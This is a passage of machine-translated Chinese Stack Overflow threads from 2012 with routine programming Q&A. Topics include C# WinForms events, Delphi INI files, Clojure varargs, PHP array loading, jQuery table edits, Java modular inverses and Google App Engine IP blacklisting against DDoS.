                    this.Text = string.Format(" Add Reservation Of the Selected Lessee ");
                }
                else
                    if (formtype == Formtype.EditSelected && Reservationid > 0)
                    {
                        ReservationIdtextEdit.Enabled = false;
                        SaveBtn.Text = "&Edit";
                        SaveBtn.Image = Resources.brush_16;
                        this.Text = string.Format("Edit Reservation Of the Selected Lessee");
                    }
                    else
                        if (formtype == Formtype.addselected2 && Reservationid > 0)
                        {
                            ReservationIdtextEdit.Enabled = false;
                            this.Text = string.Format(" Add Reservation Of the Selected Room ");
                        }
                        else
                            if (formtype == Formtype.Editselected2 && Reservationid > 0)
                            {
                                ReservationIdtextEdit.Enabled = false;
                                SaveBtn.Text = "&Edit";
                                SaveBtn.Image = Resources.brush_16;
                                this.Text = string.Format(" Edit Reservation of The Selected Room");
                            }

    }

    private void OnDoubleClick(object sender, CustomDoubleClickEventArgs args)
    {
        txtLesseeName.Text = args.SearchLessee.Name;
        LastNamelabelControl.Text = args.SearchLessee.LastName;
        LesseeIdlabelControl.Text = args.SearchLessee.Lesseeid.ToString();

    }

    private void SelectLesseeBtn_Click(object sender, EventArgs e)
    {
        SearchLs = new SelectLessee();
        SearchLs.Show();

    }

    private void SelectRoom_Click(object sender, EventArgs e)
    {
        SelectRoomfrm slr = new SelectRoomfrm();

        slr.ShowDialog();
    }

    private void SelectEmployee_Click(object sender, EventArgs e)
    {
        SelectEmployeefrm empfrm = new SelectEmployeefrm();
        empfrm.ShowDialog();
    }

    void ClearField()
    {
        dateEdit1.EditValue = null;

        dateEdit2.EditValue = null;
        dateEdit3.EditValue = null;
        txtLesseeName.Text = null;
        LesseeIdlabelControl.Text = null;
        LastNamelabelControl.Text = null;
        textEdit3.Text = null;
        textEdit4.Text = null;
    }

    private void Dates_values(object sender, EventArgs e)
    {

    }

    private void Dates_values2(object sender, EventArgs e)
    {

        DateTime dtarrival = dateEdit1.DateTime;
        DateTime dtdeparture = dateEdit2.DateTime;

        if (dtarrival == dtdeparture)
        {
            MessageBox.Show(" Arrival Date cannot be the same as departure Date , Please Change Dates ", " Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            SaveBtn.Enabled = false;

        }
        else
        {
            SaveBtn.Enabled = true;
        }

      }

     }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T07:59:23.937

我的方法是使用事件，在您的表单中创建一个包含您的数据的事件，以及一个包含您希望显示的值的自定义事件参数。下面的代码演示了我是如何做到的。希望这会有所帮助

你可以在[这里找到解决方案](http://www.4shared.com/zip/9cNHCNNE/TestApplication.html)

```
//Issue
public class Issue
{
    public string Value1 { get; set; }
    public int Value2 { get; set; }
}

//My custom evenntArgs
public class CustomDoubleClickEventArgs : EventArgs
{
    public Issue Issue { get; set; }
}

//Form 2 : Containing the xtragrid

public event EventHandler<CustomDoubleClickEventArgs> CustomViewDoubleClick;

//Handle the view double click event
private void GridView_DoubleClick(object sender, EventArgs e)
{
    if (CustomViewDoubleClick == null)
        return;

    CustomViewDoubleClick(this, new CustomDoubleClickEventArgs() 
    { 
        Issue = new Issue() 
        {  
            //You can use GetFocusedRowCellValue(col) rather than GetRowCellValue(handle, col)
            Value1 = GridView.GetFocusedRowCellValue("Name").ToString(),
            Value2 = Convert.ToInt32(GridView.GetFocusedRowCellValue("Age"))
        }
    });
}

//Form 1 : Showing the focused row data
Form2 form2;
private void Form1_Load(object sender, EventArgs e)
{
    form2 = new Form2();
    form2.CustomViewDoubleClick += OnDoubleClick;
}

private void OnDoubleClick(object sender, CustomDoubleClickEventArgs args)
{
    txFirstName.Text = args.Issue.Value1;
    txAge.Text = args.Issue.Value2.ToString();
}

private void bnShowData_Click(object sender, EventArgs e)
{
    form2.Show();
} 
```

# ios - 为双核 iDevices 编写代码

> ID：11702174
> 
> 赞同：2
> 
> 时间：2012-07-28T15:11:14.897
> 
> 标签：ios, multithreading, multicore

我对为多核设备编写代码有些疑问。最初直到 iPhone 3GS iPhone 都是单核 CPU。因此，当我为 3GS 编写应用程序时，如果我在多线程中编写代码，那么如果我在 iPhone 4 或 iPad 2（双核）中运行应用程序，iOS 是否会将这些多线程分配给不同的内核？或者开发人员有什么办法可以收获多核 CPU 特性的好处。这是iOS将不同线程分配给不同内核的责任吗？并且还假设有一个需要很长时间才能执行的函数，并且我在当前线程中调用此代码（没有创建多个线程）iOS 是否将大任务分成两个较小的任务并在不同的内核中执行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-28T15:15:58.217

如果您使用线程原语编写代码，操作系统将自动处理核心管理。

此外，如果您使用 GCD，它将为您优化内核和线程管理。

最重要的是，使用 GCD（直接或通过 NSOperationQueue 之类的帮助程序），无论您是在单 CPU 还是多 CPU 架构上，系统都会自动调整对系统 CPU 资源的访问。

# html - 文字不会跟随背景图片

> ID：11702177
> 
> 赞同：0
> 
> 时间：2012-07-28T11:10:09.997
> 
> 标签：html, css

我正在从头开始构建我的第一个站点（我以前只维护过站点或使用过程序来创建它们），如果没有全部内容，我似乎无法让文本保持在背景图像的顶部左。这是我的 HTML：

```
<html>
    <head>
        <title>Abbey Court Guest House</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>
        <div class="header">
            <p>About Us | Contact Us</p>
        </div>
    </body>
</html> 
```

这里的 CSS 模糊地做了我想要的，但它把所有东西都对齐到左边：

```
.header {
    background-image:url('images/header.jpg');
    background-position: center;
    height: 250px;
    background-repeat: no-repeat;
    color: #73622b;
    width: 1000px;
    text-align: right;
    font-family: "Verdana", "Helvetica", "sans-serif";
} 
```

删除`width: 1000px;`修复了对齐问题，但将文本推到了最右边。

*PS`header.jpg`宽 1000 像素，高 250 像素*。

有想法该怎么解决这个吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T12:48:27.223

我没有足够的代表在评论中问你以澄清你所说的“留在背景图像之上”的意思，所以如果我弄错了，请原谅我。

你想让 p 文本在 div 上居中对齐吗？

这是一个 jsfiddle [http://jsfiddle.net/LGLKe/1/](http://jsfiddle.net/LGLKe/1/)

# delphi - Delphi中TIniFIle中的换行符

> ID：11702181
> 
> 赞同：3
> 
> 时间：2012-07-28T15:11:45.893
> 
> 标签：delphi, delphi-7

如何轻松地在 TINiFile 中添加换行符？

我想将 .ini 中的每个部分分开以使其更具可读性。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T22:17:41.623

I thought I'd clarify the answer of `Wouter van Nifterick`. The current `TIniFile` object in Delphi doesn't support line breaks. To do this, you must do it manually. Here's a sample:

```
procedure LineBreakBeforeSection(const Filename, SectionName: String);
var
  L: TStringList;
  X: Integer;
  S, C: String;
begin
  L:= TStringList.Create;
  try
    L.LoadFromFile(Filename);
    C:= '['+UpperCase(SectionName)+']';
    for X:= 0 to L.Count - 1 do begin
      S:= UpperCase(Trim(L[X]));
      if S = C then begin
        L.Insert(X, '');
        Break;
      end;
    end;
    L.SaveToFile(Filename);
  finally
    L.Free;
  end;
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-29T21:15:04.477

我这样做：

*   打开 ini 文件（如 tstringlist.loadfromfile 或 tfile.readalllines）
*   遍历所有行。
    *   如果该行不是第一行，并且该行以 开头`[`，则插入一行（中断）。

作为一个函数，它不应该比编写这个伪代码花费更多的工作。

最好将它包装在 tmemini 或 tinifile 后代中，这样您就不必每次写入 inifile 时都手动调用它。

# clojure - 如何在clojure中处理java可变长度参数？

> ID：11702184
> 
> 赞同：42
> 
> 时间：2012-07-28T15:12:09.373
> 
> 标签：clojure, variadic-functions, clojure-java-interop

我正在将一个 java lib 包装到 clojure 中，但是我在处理可变长度参数时遇到了问题。说，

```
TestClass.aStaticFunction(Integer... intList){/*....*/} 
```

我怎么能在clojure中调用这个函数？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-07-28T15:28:16.360

由于 Java 可变参数[实际上是数组](http://docs.oracle.com/javase/1.5.0/docs/guide/language/varargs.html)，因此您可以通过传递数组在 Clojure 中调用可变参数函数。

您可以将 Clojure seq（也许通过使用 Clojure 的各种可变参数函数）转换为数组：

```
 (TestClass/aStaticFunction (into-array Integer [(int 1),(int 2)])) 
```

或者

```
(defn a-static-function-wrapper [& args]
  (TestClass/aStaticFunction (into-array Integer args)) 
```

或者制作一个数组并手动设置它的索引

```
(TestClass/aStaticFunction (doto (make-array Integer 3)
                              (aset 0 first-element)
                              (aset 1 second-element)
                              (aset 2 third-element))) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-28T15:28:35.897

Java 可变长度参数实际上需要一个数组作为输入。

所以在 Clojure 中，调用应该是这样的：

```
(TestClass/aStaticFunction (into-array Integer some-sequence-of-integers)) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-07-28T15:39:06.637

```
(TestClass/aStaticFunction (to-array '(1 2 3 4 5))) 
```

例如

```
(java.util.Arrays/asList (to-array '(1 2 3 4 5))) 
```

# java - Google App Engine 和 dos.xml

> ID：11702186
> 
> 赞同：6
> 
> 时间：2012-07-28T15:13:02.430
> 
> 标签：java, google-app-engine, blacklist, ddos

我的理解是，真正减轻 DDoS 攻击的唯一方法是自动化将 IP 地址/范围列入黑名单的过程。

Google App Engine (GAE) 允许您`dos.xml`在任何给定时间配置和上传文件并指定 IP 地址/范围以列入黑名单。

显然，如果我的 Web 应用程序受到精心策划的 DDoS 攻击，那么攻击我的 IP 地址/范围将不断变化。

GAE 允许我多久更新一次`dos.xml`？更改需要多长时间才能生效？我问是因为我正在设计一个`AutoBlacklister`系统来检查它认为是攻击者的 IP 地址，并会`dos.xml`动态更新。如果攻击者超过 100 个（GAE 将您限制为 100 个地址/范围），那么只有前 100 个“最严重的罪犯”会出现在列表中。

但是，如果`dos.xml`只能以一定的周期（比如一天一次等）进行更新，并且如果需要太长时间（超过几分钟！）才能生效，那么这个系统对于**真正的**DDoS来说几乎是无用的.

此外，这个问题假设有一种方法可以自动上传`dos.xml`：有吗？我想*有*一个安全的 URL，我可以使用类似的东西将文件上传到`HttpClient`，但是使用 GAE，您永远不知道您将面临哪些条款/限制！提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T01:02:45.373

您可以`dos.xml`通过[AppCfg](https://developers.google.com/appengine/docs/java/tools/uploadinganapp#Managing_DoS_Protection)进行更新。可以在不完全重新部署服务器的情况下更新此文件，这是一个昂贵的过程。据我所知，执行此更新的频率没有限制。

完全部署确实有一个限制，如下[所述](https://developers.google.com/appengine/docs/quotas#Deployments)：

> 开发人员上传应用程序的次数。目前的配额是每天 1,000 个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-29T13:24:27.023

将 IP 列入黑名单并不是 100% DDoS 证明缓解技术，因为：

A.) 僵尸网络 DDoS 将使用合法 IP（即木马僵尸网络），在这种情况下，IP 封锁也会阻止合法用户的访问。

B.) 这对网络 DDoS 攻击（即 SYN Flood）毫无作用 - 一种使用欺骗性 IP 的攻击，甚至不需要为 DDoS 工作建立完整的 2 路连接。（要阻止这种情况，您需要安装某种前门反向代理，以防止访问，直到建立完整的 2 连接 --> 收到 ACK。）

要获得完整的 DDoS 保护，您需要有一个足够大的“管道”，或者通过投资硬件（过于庞大，因此通常不划算）或前门代理解决方案来平衡额外流量，同时允许您保持全面运行（即云代理）。

# php - imagemagick convert.exe 错误

> ID：11702187
> 
> 赞同：2
> 
> 时间：2012-07-28T15:13:04.193
> 
> 标签：php, imagemagick

我将planets.png 转换为planets.jpg 的代码

```
<?php 
exec("convert planets.png planets.jpg");
?> 
```

仅显示空白页不起作用。

我已经安装了 imagemagick，因为它在 phpinfo() 中[显示在这里查看](http://i.stack.imgur.com/IRJlG.png)

这里是否还有其他配置可以运行该 imagemagick 代码。

错误信息

```
[Sat Jul 28 20:16:11 2012] [error] [client 127.0.0.1] PHP 1\. {main}() D:\\wamp\\www\\test\\into.php:0 Invalid Parameter - planets.jpg 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T15:24:46.453

这就是为什么有错误消息很重要。有了它，我们可以寻找答案。

您无意中运行了名为 convert.exe 的 Microsoft Windows 程序，而不是同名的 ImageMagick 程序。Windows convert.exe 程序用于将系统启动盘从 MS-DOS“FAT”格式转换为 NTFS 格式。因此，它只能在系统的生命周期中使用一次。[来源](http://imagemagick.sourceforge.net/http/www/FAQ.html#C19)

# 解决方案

你可以

*   重命名 MS convert.exe 或 ImageMagick convert.exe
*   修改您的 PATH 以将 ImageMagick 的 convert.exe 放在 MS convert.exe 之前
*   [按照http://savage.net.au/ImageMagick/html/install-convert.html](http://savage.net.au/ImageMagick/html/install-convert.html)中的说明编辑您的 Windows 注册表

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-28T15:25:02.347

```
exec("convert planets.png planets.jpg"); 
```

这完全等同于打开命令提示符窗口并执行它。

此外，正如@Elzo 指出的那样，`convert.exe`它是一个内置的可执行文件，因此您需要指定可执行文件的整个路径。（我建议这样做而不是重命名任何一个可执行文件）。

```
exec("\"C:\\Program Files\\..\\convert.exe\" planets.png planets.jpg"); 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-07-28T15:18:03.567

php 的 ImageMagic 扩展与 ImageMagics 'convert' 命令无关。它是单独的软件。确定您已在系统上安装了命令？尝试在 shell 中手动使用它。

phpinfo() 中显示的是 ImageMagic 扩展。那个没有带来“转换” cli 实用程序，并且必须使用与您尝试的完全不同的方式。

# php - PHP与百万数组宝贝

> ID：11702192
> 
> 赞同：13
> 
> 时间：2012-07-28T15:13:28.233
> 
> 标签：php, apc, large-data

假设您有以下整数数组：

```
array(1, 2, 1, 0, 0, 1, 2, 4, 3, 2, [...] ); 
```

整数最多可达一百万个条目；只是它们没有被硬编码，而是预先生成并存储在 JSON 格式的文件中（大小约为 2MB）。这些整数的顺序很重要，我不能每次都随机生成它，因为它应该是一致的并且总是在相同的索引处具有相同的值。

如果之后在 PHP 中读回该文件（例如使用`file_get_contents`+ `json_decode`），则需要 700 到 900 毫秒才能将数组取回——“好吧”我想，“这可能是合理的，因为`json_decode`必须解析大约 200 万个字符，让我们缓存它” . APC 将其缓存在大约 68MB 的条目中，可能是正常的，zval 很大。**然而，从 APC 取回这个数组也需要 600 毫秒**，这在我看来还是太多了。

*编辑：APC 确实序列化/反序列化以存储和检索具有一百万个项目数组的内容是一个漫长而繁重的过程。*

所以问题：

*   ~~如果我打算在 PHP 中加载一百万个条目数组，无论是数据存储还是方法，我是否应该期待这种延迟？据我了解，APC 存储 zval 本身，因此理论上从 APC 检索它应该尽可能快（无解析，无转换，无磁盘访问）~~

*   ~~为什么 APC 对于看似简单的事情如此缓慢？~~

*   有没有任何有效的方法可以使用 PHP 将一百万个条目数组完全加载到内存中？假设 RAM 使用没有问题。

*   如果我要根据索引仅访问该数组的切片（例如，将块从索引 15 加载到索引 76）并且实际上永远不会将整个数组放在内存中（是的，我知道这是明智的做法，但我想知道所有方面），对于完整的阵列，最有效的数据存储系统是什么？显然不是 RDBM；我在考虑redis，但我很乐意听到其他想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T17:46:24.290

假设整数都是 0-15。然后每个字节可以存储 2 个：

```
<?php
$data = '';
for ($i = 0; $i < 500000; ++$i)
  $data .= chr(mt_rand(0, 255));

echo serialize($data); 
```

跑步：`php ints.php > ints.ser`

现在您有一个包含 500000 字节字符串的文件，其中包含 1,000,000 个从 0 到 15 的随机整数。

装载：

```
<?php
$data = unserialize(file_get_contents('ints.ser'));

function get_data_at($data, $i)
{
  $data = ord($data[$i >> 1]);

  return ($i & 1) ? $data & 0xf : $data >> 4;
}

for ($i = 0; $i < 1000; ++$i)
  echo get_data_at($data, $i), "\n"; 
```

我机器上的加载时间约为 0.002 秒。

当然，这可能并不直接适用于您的情况，但它比包含一百万个条目的臃肿 PHP 数组要快得多。坦率地说，在 PHP 中拥有这么大的数组从来都不是正确的解决方案。

我也不是说这也是正确的解决方案，但如果它符合您的参数，它绝对是可行的。

请注意，如果您的数组有 0-255 范围内的整数，您可以摆脱包装，只需将数据作为`ord($data[$i])`. 在这种情况下，您的字符串将是 1M 字节长。

最后，根据文档`file_get_contents()`，php会对文件进行内存映射。如果是这样，您最好的表现是将原始字节转储到文件中，并像这样使用它：

```
$ints = file_get_contents('ints.raw');
echo ord($ints[25]); 
```

这假设它`ints.raw`正好是一百万字节长。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:20:33.900

APC 存储序列化的数据，因此在从 APC 加载回数据时必须对其进行反序列化。这就是您的开销所在。

加载它的最有效方法是以 PHP 和 include() 的形式写入文件，但是对于包含一百万个元素的数组，你永远不会有任何效率水平......它需要大量的内存，并且加载需要时间。这就是发明数据库的原因，那么数据库有什么问题？

**编辑**

如果您想加快序列化/反序列化，请查看[igbinary](http://pecl.php.net/package/igbinary)扩展

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T15:36:39.190

正如 Mark 所说，这就是创建数据库的原因——允许您根据常规使用模式有效地搜索（和操作，但您可能不需要）数据。它也可能比使用数组实现自己的搜索更快。我猜我们正在谈论每次访问数组时都会序列化和反序列化的接近 2-300MB 的数据（序列化之前）。

如果您想加快速度，请尝试分别分配数组的每个元素 - 您可能会用函数调用开销换取序列化所花费的时间。你也可以用你自己的扩展来扩展它，将你的数据集包装在一个小的检索界面中。

我猜你不能直接存储 zval 的原因是因为它们包含内部状态，你根本不能只将变量符号表指向前一个表。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T15:32:24.760

> 我不能每次都随机生成它，因为它应该是一致的，并且在相同的索引处始终具有相同的值。

你读过伪随机数吗？有一个叫做种子的小东西可以解决这个问题。

还要对您的选择和主张进行基准测试。您是否对 file_get_contents 与 json_decode 进行了计时？这里需要在存储和访问成本之间进行权衡。例如。如果您的数字是 0..9（或 0..255），那么将它们存储在 2Mb 字符串中并在此使用访问函数可能会更容易。无论是从 FS 还是 APC，2Mb 的加载速度都会更快。

# jquery - 打印动态内容 - 在克隆中替换

> ID：11702207
> 
> 赞同：0
> 
> 时间：2012-07-28T15:14:52.460
> 
> 标签：jquery, printing

我想打印一个动态添加内容的页面。我尝试这样做：

```
$("body").on("click", function() {

    function preparePrint() {
        var print_window = window.open();
        var print_document = $("div.container").clone();

        print_document.find('.block').each(replaceWith("X"));

        print_window.document.open();
        print_window.document.write(print_document.html());
        print_window.document.close();
        print_window.print();
        print_window.close();
    }

    $("#print").click(function() {
        preparePrint();
    })
}) 
```

每次单击时，都会克隆`div`with 类的内容。持有一些s 和桌子。在克隆中，我尝试使用类查找元素并将它们替换为大写“X”。是动态添加到某些s的类。`container``container``div``block``block``td`

然后，我打开一个新窗口并将克隆的 html 内容放在那里。然后我打印它。

到目前为止，一切都很好，但替换不起作用 - 为什么？我也试过`document.write`，`html()`并`text()`在那里得到“X”，但没有效果。我总是得到一个白页，所以克隆也可能有问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T21:07:54.147

```
print_document.find('.block').each(function(){ $(this).replaceWith("X") }); 
```

# objective-c - Objective-C Mac-App 顶栏

> ID：11702209
> 
> 赞同：0
> 
> 时间：2012-07-28T15:15:05.627
> 
> 标签：objective-c, macos, navigation, widget

我目前正在寻找 Mac OSX 应用程序的小部件，它看起来像这样： ![在此处输入图像描述](../Images/b1adfbd2ffd3b241e2cb7ae666caff94.png)

我在很多应用程序中都看到过这样的“顶栏”，所以我认为应该有一个小部件，但我还没有找到任何关于这个的东西。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:25:54.447

那是一个[NSToolbar](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSToolbar_Class/Reference/Reference.html)。Apple 提供了几个不同的示例来展示如何创建工具栏并向其添加项目：[SimpleToolbar](https://developer.apple.com/library/mac/#samplecode/SimpleToolbar/Introduction/Intro.html#//apple_ref/doc/uid/DTS40008817)和[ToolbarSample](https://developer.apple.com/library/mac/#samplecode/ToolbarSample/Introduction/Intro.html#//apple_ref/doc/uid/DTS10000413)。像 iTunes 中的项目需要在工具栏项目中自定义视图。

# jquery - 使用 JQuery 更改下一个文本

> ID：11702214
> 
> 赞同：1
> 
> 时间：2012-07-28T15:15:29.620
> 
> 标签：jquery, html-table, jquery-selectors, row

我有网格行方案，如：

```
<tr>
    <td>110</td>
    <td><input class="client-chb" name="checkedRecords" type="checkbox" value="110" title="checkedRecords"></td>
    <td>Some name</td>
    <td>Some other name</td>
    <td>1.1.2012</td>
</tr> 
```

我有一个功能，我可以获取所有选中的复选框，获取它们的值并通过 ajax 发送到服务器。

但是我想在发布那个 ajax 帖子之前获得 3 和 4`<td>`并更改文本样式，例如：

```
<td><b>Some name</b></td> 
```

我需要这个，反之亦然。或者更清楚地说，这是“标记为已读”和“标记为未读”的消息收件箱。

```
function MarkAsUnread() {
    var idata = new Array();
    $(".client-chb:checked").each(function() {
        var test = $(this);
        // maybe here, test -> find next td -> change text
        idata.push($(this).val());
    });
    //other logic
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:21:03.140

您可以尝试以下方法：

```
function MarkAsUnread() {
    var idata = new Array();
    $(".client-chb:checked").each(function() {
        $(this).closest('tr').find('td').slice(2, 4).wrapInner('<b/>')
        idata.push($(this).val());
    });
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:19:25.547

您已经迭代了包含在 TD 中的输入元素，因此首先您要设置输入元素的父元素（复选框）并执行下一个..

喜欢，

```
function MarkAsUnread() {
    var idata = new Array();
    $(".client-chb:checked").each(function() {
        var test = $(this).parent();
        var next1 = test.next();
        var next2 = test.next().next();
        idata.push(next1.val());
        idata.push(next2.val());
    });
    //other logic
} 
```

要获取或设置下一个和下一个 TD 的内容，请使用 next1.val() 和 next2.val()

# java - Java 逆模 2**64

> ID：11702215
> 
> 赞同：5
> 
> 时间：2012-07-28T15:15:47.830
> 
> 标签：java, modulo, inverse

给定一个奇数`long x`，我正在寻找`long y`它们的乘积模`2**64`（即，使用正常的溢出算法）等于 1。为了明确我的意思：这可以在几千年内以这种方式计算：

```
for (long y=1; ; y+=2) {
    if (x*y == 1) return y;
} 
```

我知道这可以使用扩展的欧几里得算法快速解决，但它需要能够表示所有涉及的数字（范围高达`2**64`，因此即使无符号算术也无济于事）。使用`BigInteger`肯定会有所帮助，但我想知道是否有更简单的方法，可能使用为正数实现的扩展欧几里得算法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:57:45.303

与此同时，我回忆/重新发明了一个非常简单的解决方案：

```
public static int inverseOf(int x) {
    Preconditions.checkArgument((x&1)!=0, "Only odd numbers have an inverse, got " + x);
    int y = 1;
    for (int mask=2; mask!=0; mask<<=1) {
        final int product = x * y;
        final int delta = product & mask;
        y |= delta;
    }
    return y;
} 
```

它之所以起作用，是因为两件事：

*   在每次迭代中，如果对应的位`product`是`1`，那么它是错误的，修复的唯一方法是改变对应的位`y`
*   一点`y`影响都没有`product`，所以以前的工作不会被撤消

我从`int`因为`long`它必须也工作，因为`int`我可以运行一个详尽的测试开始。

另一个想法：必须有一个数字`n>0`使得`x**n == 1`，因此`y == x**(n-1)`。这可能应该更快，我只是想不起足够的数学来计算`n`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:28:06.073

这是一种方法。这使用扩展的欧几里得算法来找到`abs(x)`模 2 ^(62)的逆，最后它将答案“扩展”到模 2 ^(64)的逆，并在必要时应用符号更改：

```
public static long longInverse(long x) {

    if (x % 2 == 0) { throw new RuntimeException("must be odd"); }

    long power = 1L << 62;

    long a = Math.abs(x);
    long b = power;
    long sign = (x < 0) ? -1 : 1;

    long c1 = 1;
    long d1 = 0;
    long c2 = 0;
    long d2 = 1;

    // Loop invariants:
    // c1 * abs(x) + d1 * 2^62 = a
    // c2 * abs(x) + d2 * 2^62 = b 

    while (b > 0) {
        long q = a / b;
        long r = a % b;
        // r = a - qb.

        long c3 = c1 - q*c2;
        long d3 = d1 - q*d2;

        // Now c3 * abs(x) + d3 * 2^62 = r, with 0 <= r < b.

        c1 = c2;
        d1 = d2;
        c2 = c3;
        d2 = d3;
        a = b;
        b = r;
    }

    if (a != 1) { throw new RuntimeException("gcd not 1 !"); }

    // Extend from modulo 2^62 to modulo 2^64, and incorporate sign change
    // if necessary.
    for (int i = 0; i < 4; ++i) {
        long possinv = sign * (c1 + (i * power));
        if (possinv * x == 1L) { return possinv; }
    }

    throw new RuntimeException("failed");
} 
```

^(我发现使用 2 62)比使用 2 ^(63)更容易，主要是因为它避免了负数的问题：作为 Java的 2 ^(63)`long`是负数。

# asp.net-mvc - 单击链接时将选定的单选按钮值传递给控制器

> ID：11702229
> 
> 赞同：0
> 
> 时间：2012-07-28T15:17:44.130
> 
> 标签：asp.net-mvc, razor

我正在开发一个项目，我们将 ASP.net MVC 3.0 与 Razor 一起使用。我们有一个要求，其中我们必须创建一个页面来显示带有单选按钮的客户列表以选择列表中的一行。当用户使用单选按钮选择一行并单击编辑/详细信息/删除按钮时，将在控制器中调用相应的操作。

我能够跟踪选择了哪个单选按钮，但无法弄清楚当用户单击编辑/详细信息/删除按钮时如何将此值传递给控制器​​。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T23:58:48.170

感谢 Yaseer 和 HatSoft，

我找到了使用 ajax.ActionLink、一个隐藏字段和 jQuery 动态传递参数的方法。下面是解决方案

```
 @Ajax.ActionLink("Edit", "Edit", new { subCategoryId = "0" }, new AjaxOptions { HttpMethod = "Get" }, new { @class = "linkButton", id = "btnEditSubCat" })
<input type="hidden" id="hdnsubCategoryId" /> 
```

我添加了一个隐藏字段，其中包含与单选按钮关联的当前选定 ID，并使用 jQuery 将其分配给 href

```
 $(document).ready(function () {
    $('input[type=radio]').change(function () {
        $('#hdnsubCategoryId').val($(this).val());
        $('#btnEditSubCat').attr('href', "/subcategory/Edit?subCategoryId=" + $('#hdnsubCategoryId').val());
});
}) 
```

# delphi - 无法在组框上拖放单选按钮

> ID：11702230
> 
> 赞同：2
> 
> 时间：2012-07-28T15:17:44.737
> 
> 标签：delphi, delphi-7

当我尝试将单选按钮拖放到 groupbox 上时，单选按钮永远不会落入 groupbox，但总是在其后面，这使得单选按钮不可见，因为 groupbox 在前面。有一些选项是 groupbox 总是在顶部。如何禁用它，以便我可以添加单选按钮 INTO/on groupbox 而不是在 groupbox 后面？尝试右键单击组框-控制-发送到后面，但它不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-29T08:47:09.363

要将新的单选按钮放在组框上，请在表单设计器中选择组框，然后从 Component Palette 中选择单选按钮并单击组框。如果您不小心将单选按钮放在表单或不同的父级上，您可以将其删除并添加一个新的，或者使用 Object TreeView 将单选按钮拖到正确的父级上。我为你制作了一个[小视频](http://www.youtube.com/watch?v=Vt_QfksWgaI)。

如果您的目标父对象不是组框 ( [`TGroupBox`](http://docwiki.embarcadero.com/Libraries/en/Vcl.StdCtrls.TGroupBox)) 而是单选组 ( [`TRadioGroup`](http://docwiki.embarcadero.com/Libraries/XE2/en/Vcl.ExtCtrls.TRadioGroup))，您将无法向其中添加任何子控件 - 单选组旨在不允许任何子控件。您只能通过[`Items`](http://docwiki.embarcadero.com/Libraries/en/Vcl.ExtCtrls.TRadioGroup.Items)属性定义其单选按钮。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:33:44.783

尝试在 Object TreeView 中的 GroupBox 上拖动 RadioButton。按名称在那里找到它。默认情况下，您可以通过按 Shift+Alf+F11 打开 Object TreeView。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T17:25:44.083

在表单设计器中单击 GroupBox（即在表单上，​​而不是在组件面板上）。

然后双击组件面板中的单选按钮。

然后应将单选按钮作为所述 GroupBox 的子组件添加到 GroupBox。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-15T10:30:17.617

你为什么要费心去做这些？只需选择一个单选按钮并在组框上单击它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-04-06T08:43:10.357

尝试这个

```
CREATE GrpBox1 AS GROUPBOX
    Left = 295
    Top = 84
    Caption = "GrpBox1"

    CREATE RadioBtn1 AS RADIOBUTTON
        Left = 13
        Top = 25
        Caption = "RadioBtn1"
    END CREATE

END CREATE ' dont forget radio button is child of groupbox 
```

# javascript - Backbone.Marionette 没有方法 'bindTo'

> ID：11702234
> 
> 赞同：0
> 
> 时间：2012-07-28T15:18:16.427
> 
> 标签：javascript, backbone.js, marionette

第一次尝试木偶。按照此处的示例：

[https://github.com/derickbailey/backbone.marionette/blob/master/docs/marionette.itemview.md#binding-to-itemview-events](https://github.com/derickbailey/backbone.marionette/blob/master/docs/marionette.itemview.md#binding-to-itemview-events)

我收到此错误：

```
Uncaught TypeError: Object [object Object] has no method 'bindTo' 
```

我还尝试从示例中复制/粘贴整个代码片段，这也会引发该错误。那么我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T13:54:39.383

这已在 2 天前的 v0.9.6 中修复。获取最新版本，它现在应该可以正常工作了。

# c# - 带有锁的 QueueUserWorkItem 是否正确实现？

> ID：11702236
> 
> 赞同：2
> 
> 时间：2012-07-28T15:18:21.530
> 
> 标签：c#, .net, locking, threadpool

我已经实现了如下的日志记录方法：

```
 ThreadPool.QueueUserWorkItem((state) => {
    lock (appendLock) {
       using (StreamWriter log = File.AppendText(_logFile)) {
          log.WriteLine(message);
       }
    }
 }, null); 
```

1：有`lock`必要吗？我想线程化日志记录并发现锁已经到位。因此，我没有更改该代码，而是简单地包装了一个工人代表。

